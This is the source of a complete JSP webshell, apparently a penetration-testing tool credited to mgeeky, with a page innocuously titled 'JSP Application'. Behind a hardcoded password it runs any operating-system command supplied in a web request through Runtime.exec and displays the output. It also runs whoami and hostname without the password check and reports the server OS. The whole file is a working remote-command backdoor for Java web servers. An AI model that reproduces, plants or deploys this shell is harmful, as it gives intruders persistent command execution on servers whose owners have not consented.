<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>
<%!

    // =====================================================================
    // Setup global password necessary to pass before using that webshell.
    public String HardcodedPassword = "5eQzrXZHZwJNLvm6Q2b7PR6r";

    // =====================================================================

    public String execute(String pass, String cmd, Boolean skip) {
        StringBuilder res = new StringBuilder();

        if (cmd != null && cmd.length() > 0 && ((skip) || (pass.equals(HardcodedPassword) || HardcodedPassword.toLowerCase().equals("none")))){
            try {
                Process proc = Runtime.getRuntime().exec(cmd);
                OutputStream outs = proc.getOutputStream();
                InputStream ins = proc.getInputStream();
                DataInputStream datains = new DataInputStream(ins);
                String datainsline = datains.readLine();

                while ( datainsline != null) {
                    res.append(datainsline + "<br/>");
                    datainsline = datains.readLine();
                }
            } catch( IOException e) {
                return "IOException: " + e.getMessage();
            }
        }
        else {
            return "Wrong password or no command issued.";
        }

        String out = res.toString();
        if (out != null && out.length() > 5 && out.indexOf("<br/>") != -1) { 
            out = out.substring(0, out.length() - 5);
        }
        out = out.replaceAll("(\r\n|\n\r|\n|\r)", "<br/>");
        return out;
    }
%><!DOCTYPE html>
<html>
    <head>
        <title>JSP Application</title>
    </head>
    <body>
        <h3>Authenticated JSP Webshell.</h3>
        <i style="font-size:12px">You need to provide a valid password in order to leverage this application.</i>
        <br/>
        <font style="font-size:5px" style="font-style:italic;color:grey">coded by <a href="https://github.com/mgeeky">mgeeky</a></font>
        <br/>
        <hr/>
        <form method=post>
        <table style="width:100%; font-size: 12px">
                        <tr>
                                <td>OS:</td><td style="width:100%">
                                    <% out.print(System.getProperty("os.name")); %>
                                </td>
                        </tr>
            <tr>
                <td><b style="color:red; font-size:10px">Password:</b></td><td style="width:90%"><input type=password width=40 name="password" value='<% out.print((request.getParameter("password") != null) ? request.getParameter("password") : ""); %>' /></td>
            </tr>
            <tr>
                <td><b style="color:blue; font-size:11px"><% out.print(execute("", "whoami", true) + "@" + execute("", "hostname", true));%></b></td><td style="width:90%"><input type=text size=100 name="cmd" value='<% out.print((request.getParameter("cmd") != null) ? request.getParameter("cmd") : "uname -a"); %>' onClick="" onkeydown="if (event.keyCode == 13) { this.form.submit(); return false; }" /></td>
            </tr>
            <tr>
                <td><input type=submit style="position:absolute;left:-9999px;width:1px;height:1px;" tabindex="-1"/></td><td></td>
            </tr>
        </table>
        </form>
        <hr />
        <pre style="background-color:black;color:lightgreen;padding: 5px 25px 25px 25px;"><%
            if (request.getParameter("cmd") != null && request.getParameter("password") != null) {
                out.println("<br/>server$ " + request.getParameter("cmd") + "<br/>");
                out.println(execute(request.getParameter("password"), request.getParameter("cmd"), false));
            }
        %></pre>
    
    </body>
</html>

